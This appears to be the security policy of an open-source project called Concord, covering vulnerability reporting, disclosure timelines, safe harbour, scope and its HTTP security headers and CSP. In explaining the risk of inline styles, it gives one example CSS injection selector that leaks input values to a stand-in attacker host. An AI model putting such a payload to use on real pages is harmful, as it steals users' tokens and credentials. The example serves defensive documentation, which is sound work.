# Security Policy

Concord stores account credentials, session records and uploaded registers that list who holds
what. We take reports about security vulnerabilities seriously and appreciate the contributions of
the security research community.

## Reporting a Vulnerability

### Primary Channel (GitHub Advisory)
If you have a GitHub account, please report security vulnerabilities using GitHub's private vulnerability
reporting:
1. Navigate to the Concord repository page on GitHub.
2. Go to **Security → Report a vulnerability**.
3. Provide details including:
   - What component is affected and which commit/version.
   - Detailed step-by-step reproduction instructions or a minimal proof of concept.
   - The impact and what an attacker could achieve.

### Fallback Channel (Email)
If you do not have a GitHub account or cannot access GitHub's private vulnerability reporting, you can
submit reports directly via email to:
- **`security@useconcord.org`**

Please encrypt sensitive details or request a public PGP key before transmitting exploitable payloads.
Include the same reproduction details as requested above.

---

## Response & Disclosure Timeline

We adhere to a standard **90-day coordinated disclosure timeline**:

1. **Initial Acknowledgment:** We aim to acknowledge receipt of your vulnerability report within
   **5 business days**.
2. **Triaging & Assessment:** Within **10 business days**, we will review the submission, reproduce the
   finding, assess severity, and provide an initial response with next steps or remediation plans.
3. **Regular Updates:** We will provide progress updates at least once every **14 calendar days** while
   a patch is being developed and validated.
4. **Remediation & Patching:** We work to develop and test patches as rapidly as possible, targeting
   completion within **90 calendar days** from initial report acknowledgment.
5. **Public Disclosure:** Public release of the patch and advisory will be coordinated jointly between
   maintainers and the reporter. If a critical zero-day is being actively exploited in the wild, we may
   accelerate disclosure and patching to protect users.

---

## Safe Harbour

We consider security research conducted under this policy to be:
- **Authorized** under applicable anti-hacking laws (including the Computer Fraud and Abuse Act (CFAA)
  and equivalent legislation).
- **Exempt** from anti-circumvention claims under the DMCA and similar legal frameworks.
- **Lawful**, helpful to the overall safety of the internet, and conducted in good faith.

If you conduct your research in good faith in accordance with this policy:
- We will not pursue civil action or initiate legal complaints against you regarding your research.
- If third parties pursue legal action against you for research conducted following this policy, we
  will state that your research was authorized by us.
- You must make a good-faith effort to avoid privacy violations, destruction of data, and interruption
  or degradation of services.
- You must not access, modify, or retain customer or holder data. If you inadvertently encounter
  sensitive personal or financial data, stop and contact us immediately without copying or sharing it.

---

## Scope

### In Scope
- Reading or changing another workspace's data (workspaces are meant to be isolated).
- Bypassing sign-in, session, invitation, reset-link, or sign-up-code checks.
- Weaknesses in password storage, cookies, CSRF, origin checks, or rate limiting.
- Injection, path traversal, or unsafe file handling in the API, the CLI, or the static server.
- Reconciliation results that can be made to show the wrong figures through crafted input.

### Out of Scope
- Denial of service by sheer volume. Concord is one process on one disk, and the documentation says so.
- Findings that require local access to the server's disk or direct modification of environment variables.
- Missing hardening on deployments that ignore documentation (such as serving over unencrypted plain HTTP).
- Vulnerabilities in upstream Stellar network nodes, public Horizon/Soroban RPC providers, or external infrastructure.
- Social engineering attacks against operators or contributors.

---

## Operational Security Guidelines

- Concord sends no email. Invitations and password resets are links the operator hands over, so
  treat them as secrets.
- Set `CONCORD_PUBLIC_URL` to the HTTPS address people use, and configure `CONCORD_TRUST_PROXY` only
  to the number of reverse proxies you actually run. A wrong value allows clients to spoof IP addresses
  and bypass rate limits.
- Back up the data directory regularly (`pnpm concord backup`). It holds every account, workspace, and
  audit record.

---

## Supported Versions

| Version / Branch | Supported | Notes |
| :--- | :---: | :--- |
| `main` (HEAD) | Yes | Currently supported; continuously patched. |
| Tagged releases | Planned | Once semver releases are tagged, the current and immediate previous minor release will receive security patches. |
| Historical commits | No | Untagged historical commits prior to `main` HEAD are not supported. |

---

## HTTP Security Headers and CSP

Concord configures HTTP security headers and a Content Security Policy (CSP) for all routes via Hono's `secureHeaders` middleware in [`services/api/src/main.ts`](./services/api/src/main.ts#L76-L93). These headers harden both the static dashboard shell and API responses against injection, framing, and transport attacks (see also [`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)).

### Header and Directive Specifications

The table below lists every header and CSP directive configured in `services/api/src/main.ts`, copying values directly from the code:

| Header | Value | Reason |
| :--- | :--- | :--- |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'` | Hardens browser execution context across static and API responses ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
| `Content-Security-Policy: default-src` | `'self'` | Fallback restriction for resource directives; limits fetching to the application's origin ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
| `Content-Security-Policy: script-src` | `'self'` | Rationale not documented. Restricts JavaScript execution to same-origin scripts (standard meaning, not a recorded Concord decision). |
| `Content-Security-Policy: style-src` | `'self' 'unsafe-inline'` | Explicit code comment in `services/api/src/main.ts`: `// React sets element styles inline.` (see subsection below; tracked in Issue #453). |
| `Content-Security-Policy: img-src` | `'self' data:` | Rationale not documented. Permits loading images from the origin and via inline data: URIs (standard meaning, not a recorded Concord decision). |
| `Content-Security-Policy: font-src` | `'self'` | Rationale not documented. Restricts font resource loading to the origin (standard meaning, not a recorded Concord decision). |
| `Content-Security-Policy: connect-src` | `'self'` | Rationale not documented. Restricts fetch, XHR, and WebSocket network targets to the origin (standard meaning, not a recorded Concord decision). |
| `Content-Security-Policy: object-src` | `'none'` | Prevents execution of browser plugins (e.g., Flash, Java) to block plugin-based vulnerabilities ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
| `Content-Security-Policy: base-uri` | `'self'` | Rationale not documented. Restricts URLs allowed in `<base>` tags to the origin, preventing base-tag injection (standard meaning, not a recorded Concord decision). |
| `Content-Security-Policy: form-action` | `'self'` | Rationale not documented. Restricts form submission targets to the origin (standard meaning, not a recorded Concord decision). |
| `Content-Security-Policy: frame-ancestors` | `'none'` | Clickjacking defense; forbids embedding Concord in frames or iframes on any domain ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains, sent only over HTTPS` | Enforces HTTPS for 1 year (31,536,000 seconds) including subdomains; omitted on plain HTTP (`publicUrl` not starting with `https://`) so local development functions without TLS ([`services/api/src/main.ts`](./services/api/src/main.ts#L90), [`docs/CONFIGURATION.md`](./docs/CONFIGURATION.md), [`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
| `Referrer-Policy` | `same-origin` | Emits referrer headers only for same-origin requests; suppresses the `Referer` header on cross-origin requests to protect URL tokens and internal paths ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md), [`docs/adr/0005-hash-routing-same-origin.md`](./docs/adr/0005-hash-routing-same-origin.md)). |
| `X-Content-Type-Options` | `nosniff` | Rationale not documented. Default set by Hono `secureHeaders()`; prevents MIME-type sniffing away from declared `Content-Type` (standard meaning, not a recorded Concord decision). |
| `X-Frame-Options` | `SAMEORIGIN` | Rationale not documented. Default set by Hono `secureHeaders()`; legacy frame-embedding protection superseded by CSP `frame-ancestors 'none'` in modern browsers (standard meaning, not a recorded Concord decision). |

### Browsers Affected

Compatibility caveats for the above headers:

- **`Content-Security-Policy: frame-ancestors 'none'`**: Supported in all modern evergreen browsers (Chrome, Firefox, Safari, Edge; see [`docs/browser-support.md`](./docs/browser-support.md)). Caveat: not supported in Internet Explorer 11. In browsers supporting CSP Level 2, `frame-ancestors` supersedes `X-Frame-Options` (Source: [MDN Web Docs: CSP: frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)).
- **`Strict-Transport-Security`**: Caveat: only effective on secure HTTPS connections; ignored by browsers when delivered over plain HTTP (Source: [MDN Web Docs: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)).
- **`X-Frame-Options: SAMEORIGIN`**: Caveat: superseded by CSP `frame-ancestors` in modern browsers supporting CSP Level 2 (Source: [MDN Web Docs: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)).
- **All other headers and directives (`default-src`, `script-src`, `style-src`, `img-src`, `font-src`, `connect-src`, `object-src`, `base-uri`, `form-action`, `Referrer-Policy`, `X-Content-Type-Options`)**: compatibility caveats not verified.

### `style-src 'unsafe-inline'`

#### What Needs It Today
- In [`services/api/src/main.ts`](./services/api/src/main.ts#L80), the setting is accompanied by the comment: `// React sets element styles inline.`
- In Issue #453, the maintainers recorded: "`style-src 'unsafe-inline'` is allowed because React sets inline styles."
- Inspection of the web application (`apps/web/src`): the dashboard code does not use JSX `style={{ ... }}` attributes and relies on Tailwind CSS utility classes. However, in Vite development mode, stylesheets are dynamically injected via inline `<style>` tags for Hot Module Replacement (HMR). Furthermore, `apps/web/public/favicon.svg` contains an embedded `<style>` block. The comment in `main.ts` reflects an initial scaffold assumption (commit `5e965a5`), as reaffirmed in Issue #453.

#### Risk in Plain Terms
Allowing `'unsafe-inline'` permits the browser to apply inline `<style>` elements and HTML `style` attributes. While it does not permit arbitrary JavaScript execution (since `script-src` disallows `'unsafe-inline'`), style injection introduces security risks:
1. **Data Exfiltration:** Malicious CSS attribute selectors can read input values character by character (e.g. `input[value^="a"] { background: url('//attacker.test/exfil?a'); }`) and leak sensitive tokens or credentials via background network requests.
2. **UI Redressing / Clickjacking:** Injected styles can reposition, hide, or overlay legitimate form buttons and inputs, tricking operators into clicking or submitting unintended actions.

#### Plan for Removing It
A plan to evaluate removing `'unsafe-inline'` is tracked in **Issue #453** ("Add Permissions-Policy and tighten the CSP: drop style-src 'unsafe-inline' in favour of hashes or nonces").

The issue proposes evaluating whether the dashboard can run entirely without inline styles (using Tailwind classes only) or serve a per-request nonce. Specific options identified, clearly labelled as not decided for maintainers to confirm:
- **Option 1 (Not decided): Strict Tailwind classes only.** Verify whether production builds require any inline styles, and drop `'unsafe-inline'` entirely from `style-src` in production.
- **Option 2 (Not decided): Cryptographic hashes (`'sha256-...'`).** Allow specific static inline stylesheets (such as the SVG `<style>` tag in `favicon.svg`) by including their cryptographic SHA-256 hashes in `style-src`.
- **Option 3 (Not decided): Per-request nonces (`'nonce-...'`).** Leverage Hono's built-in `NONCE` generator in `secureHeaders` to generate a random nonce per request and attach it to both the CSP header and any runtime `<style>` elements.

### Header Test Cross-Reference

Security header assertions are tracked in PR #1281:
- **Pull request:** [PR #1281](https://github.com/useconcord/concord/pull/1281) (`test(api): pin the security headers on static and API responses`)
- **Planned test file:** `services/api/test/static.test.ts` (lands with PR #1281; does not exist on this branch)
- **Test suite:** `describe("security headers", ...)`
- **Test cases:**
  - `sends the exact CSP, nosniff, referrer policy and frame options on static and API responses, without HSTS over http`
  - `sends HSTS over https and keeps the other headers identical`

*Note:* The test suite lands with PR #1281 (which closes Issue #505 / `CON-0427`). It pins the exact security headers and CSP emitted by `createServerApp` in `services/api/src/main.ts` for both HTTP and HTTPS origins.
